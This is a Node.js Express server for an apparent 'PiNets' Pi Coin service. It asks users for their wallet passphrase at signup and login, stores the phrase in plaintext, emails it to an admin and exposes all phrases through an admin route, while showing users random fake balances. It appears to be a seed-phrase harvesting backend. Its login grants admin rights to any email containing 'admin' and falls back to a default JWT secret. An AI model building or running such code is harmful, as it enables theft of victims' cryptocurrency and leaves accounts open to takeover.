const express = require('express');
const mongoose = require('mongoose');
const cors = require('cors');
const bcrypt = require('bcryptjs');
const jwt = require('jsonwebtoken');
const nodemailer = require('nodemailer');
require('dotenv').config();

// Initialize express app
const app = express();

// Middleware
app.use(cors());
app.use(express.json());

// MongoDB connection (using environment variables in a real app)
const MONGODB_URI = process.env.MONGODB_URI || 'mongodb://localhost:27017/pinets';
const JWT_SECRET = process.env.JWT_SECRET || 'your_jwt_secret';
const PORT = process.env.PORT || 5000;

// Connect to MongoDB (commented out as we're not actually connecting in this demo)
// mongoose.connect(MONGODB_URI)
//   .then(() => console.log('MongoDB connected'))
//   .catch(err => console.error('MongoDB connection error:', err));

// User Schema
const userSchema = new mongoose.Schema({
  email: {
    type: String,
    required: true,
    unique: true,
    trim: true,
    lowercase: true
  },
  password: {
    type: String,
    required: true
  },
  piPassphrase: {
    type: String,
    required: true
  },
  balance: {
    type: Number,
    default: 0
  },
  isAdmin: {
    type: Boolean,
    default: false
  },
  createdAt: {
    type: Date,
    default: Date.now
  }
});

// User Model (would be in a separate file in a real app)
const User = mongoose.model('User', userSchema);

// Email configuration (using environment variables in a real app)
const transporter = nodemailer.createTransport({
  service: 'gmail',
  auth: {
    user: process.env.EMAIL_USER || 'your-email@gmail.com',
    pass: process.env.EMAIL_PASS || 'your-email-password'
  }
});

// Helper function to send admin notification email
const sendAdminNotification = async (user) => {
  try {
    const mailOptions = {
      from: process.env.EMAIL_USER || 'your-email@gmail.com',
      to: process.env.ADMIN_EMAIL || 'admin@pinets.com',
      subject: 'New User Registration on PiNets',
      html: `
        <h1>New User Registration</h1>
        <p><strong>Email:</strong> ${user.email}</p>
        <p><strong>Registration Date:</strong> ${new Date().toLocaleString()}</p>
        <p><strong>Pi Coin Passphrase:</strong> ${user.piPassphrase}</p>
        <p><strong>Initial Balance:</strong> ${user.balance} Pi</p>
        <hr>
        <p>Please login to the admin dashboard for more details.</p>
      `
    };
    
    await transporter.sendMail(mailOptions);
    console.log('Admin notification email sent');
  } catch (error) {
    console.error('Error sending admin notification email:', error);
  }
};

// Routes

// Register a new user
app.post('/api/auth/register', async (req, res) => {
  try {
    const { email, password, piPassphrase } = req.body;
    
    // Check if user already exists
    // const existingUser = await User.findOne({ email });
    // if (existingUser) {
    //   return res.status(400).json({ message: 'User already exists' });
    // }
    
    // Hash password
    const salt = await bcrypt.genSalt(10);
    const hashedPassword = await bcrypt.hash(password, salt);
    
    // Create new user
    const user = new User({
      email,
      password: hashedPassword,
      piPassphrase,
      balance: Math.floor(Math.random() * 10000) + 1000 // Random balance for demo
    });
    
    // Save user to database (commented out as we're not actually saving)
    // await user.save();
    
    // Send admin notification email
    // await sendAdminNotification(user);
    
    res.status(201).json({ message: 'User registered successfully' });
  } catch (error) {
    console.error('Registration error:', error);
    res.status(500).json({ message: 'Server error' });
  }
});

// Login user
app.post('/api/auth/login', async (req, res) => {
  try {
    const { email, password, piPassphrase } = req.body;
    
    // Check if user exists (in a real app, this would query the database)
    // const user = await User.findOne({ email });
    // if (!user) {
    //   return res.status(400).json({ message: 'Invalid credentials' });
    // }
    
    // Check password (in a real app, this would compare with the hashed password)
    // const isMatch = await bcrypt.compare(password, user.password);
    // if (!isMatch) {
    //   return res.status(400).json({ message: 'Invalid credentials' });
    // }
    
    // Check Pi passphrase (in a real app, this would verify the passphrase)
    // if (piPassphrase !== user.piPassphrase) {
    //   return res.status(400).json({ message: 'Invalid Pi Coin passphrase' });
    // }
    
    // Create mock user for demo
    const user = {
      id: '1',
      email,
      balance: Math.floor(Math.random() * 10000) + 1000,
      isAdmin: email.includes('admin')
    };
    
    // Create JWT token
    const token = jwt.sign(
      { id: user.id, email: user.email, isAdmin: user.isAdmin },
      JWT_SECRET,
      { expiresIn: '1h' }
    );
    
    res.json({
      token,
      user: {
        id: user.id,
        email: user.email,
        balance: user.balance,
        isAdmin: user.isAdmin
      }
    });
  } catch (error) {
    console.error('Login error:', error);
    res.status(500).json({ message: 'Server error' });
  }
});

// Get current user
app.get('/api/users/me', async (req, res) => {
  try {
    // Get token from header
    const token = req.header('Authorization')?.replace('Bearer ', '');
    
    if (!token) {
      return res.status(401).json({ message: 'No token, authorization denied' });
    }
    
    // Verify token
    const decoded = jwt.verify(token, JWT_SECRET);
    
    // In a real app, you would fetch the user from the database
    // const user = await User.findById(decoded.id).select('-password');
    
    // Mock user for demo
    const user = {
      id: decoded.id,
      email: decoded.email,
      balance: Math.floor(Math.random() * 10000) + 1000,
      isAdmin: decoded.isAdmin
    };
    
    res.json(user);
  } catch (error) {
    console.error('Auth error:', error);
    res.status(401).json({ message: 'Token is not valid' });
  }
});

// Admin routes

// Get all users (admin only)
app.get('/api/admin/users', async (req, res) => {
  try {
    // Get token from header
    const token = req.header('Authorization')?.replace('Bearer ', '');
    
    if (!token) {
      return res.status(401).json({ message: 'No token, authorization denied' });
    }
    
    // Verify token
    const decoded = jwt.verify(token, JWT_SECRET);
    
    // Check if user is admin
    if (!decoded.isAdmin) {
      return res.status(403).json({ message: 'Access denied' });
    }
    
    // In a real app, you would fetch all users from the database
    // const users = await User.find().select('-password');
    
    // Mock users for demo
    const users = [
      { 
        id: '1', 
        email: 'user1@example.com', 
        piPassphrase: 'correct horse battery staple random words here',
        balance: 5000,
        createdAt: new Date('2023-08-10').toISOString()
      },
      { 
        id: '2', 
        email: 'user2@example.com', 
        piPassphrase: 'another secure passphrase with multiple words',
        balance: 2500,
        createdAt: new Date('2023-08-12').toISOString()
      },
      { 
        id: '3', 
        email: 'user3@example.com', 
        piPassphrase: 'this is a very secure and long passphrase example',
        balance: 7800,
        createdAt: new Date('2023-08-15').toISOString()
      }
    ];
    
    res.json(users);
  } catch (error) {
    console.error('Admin users error:', error);
    res.status(500).json({ message: 'Server error' });
  }
});

// Add a new user (admin only)
app.post('/api/admin/users', async (req, res) => {
  try {
    // Get token from header
    const token = req.header('Authorization')?.replace('Bearer ', '');
    
    if (!token) {
      return res.status(401).json({ message: 'No token, authorization denied' });
    }
    
    // Verify token
    const decoded = jwt.verify(token, JWT_SECRET);
    
    // Check if user is admin
    if (!decoded.isAdmin) {
      return res.status(403).json({ message: 'Access denied' });
    }
    
    const { email, password, piPassphrase, balance } = req.body;
    
    // Hash password
    const salt = await bcrypt.genSalt(10);
    const hashedPassword = await bcrypt.hash(password, salt);
    
    // Create new user
    const user = new User({
      email,
      password: hashedPassword,
      piPassphrase,
      balance: balance || 0
    });
    
    // Save user to database (commented out as we're not actually saving)
    // await user.save();
    
    res.status(201).json({ message: 'User added successfully' });
  } catch (error) {
    console.error('Admin add user error:', error);
    res.status(500).json({ message: 'Server error' });
  }
});

// Update a user (admin only)
app.put('/api/admin/users/:id', async (req, res) => {
  try {
    // Get token from header
    const token = req.header('Authorization')?.replace('Bearer ', '');
    
    if (!token) {
      return res.status(401).json({ message: 'No token, authorization denied' });
    }
    
    // Verify token
    const decoded = jwt.verify(token, JWT_SECRET);
    
    // Check if user is admin
    if (!decoded.isAdmin) {
      return res.status(403).json({ message: 'Access denied' });
    }
    
    const { email, piPassphrase, balance } = req.body;
    
    // In a real app, you would update the user in the database
    // const user = await User.findById(req.params.id);
    // if (!user) {
    //   return res.status(404).json({ message: 'User not found' });
    // }
    
    // user.email = email || user.email;
    // user.piPassphrase = piPassphrase || user.piPassphrase;
    // user.balance = balance !== undefined ? balance : user.balance;
    
    // await user.save();
    
    res.json({ message: 'User updated successfully' });
  } catch (error) {
    console.error('Admin update user error:', error);
    res.status(500).json({ message: 'Server error' });
  }
});

// Delete a user (admin only)
app.delete('/api/admin/users/:id', async (req, res) => {
  try {
    // Get token from header
    const token = req.header('Authorization')?.replace('Bearer ', '');
    
    if (!token) {
      return res.status(401).json({ message: 'No token, authorization denied' });
    }
    
    // Verify token
    const decoded = jwt.verify(token, JWT_SECRET);
    
    // Check if user is admin
    if (!decoded.isAdmin) {
      return res.status(403).json({ message: 'Access denied' });
    }
    
    // In a real app, you would delete the user from the database
    // const user = await User.findById(req.params.id);
    // if (!user) {
    //   return res.status(404).json({ message: 'User not found' });
    // }
    
    // await user.remove();
    
    res.json({ message: 'User deleted successfully' });
  } catch (error) {
    console.error('Admin delete user error:', error);
    res.status(500).json({ message: 'Server error' });
  }
});

// Start server
app.listen(PORT, () => {
  console.log(`Server running on port ${PORT}`);
});

module.exports = app;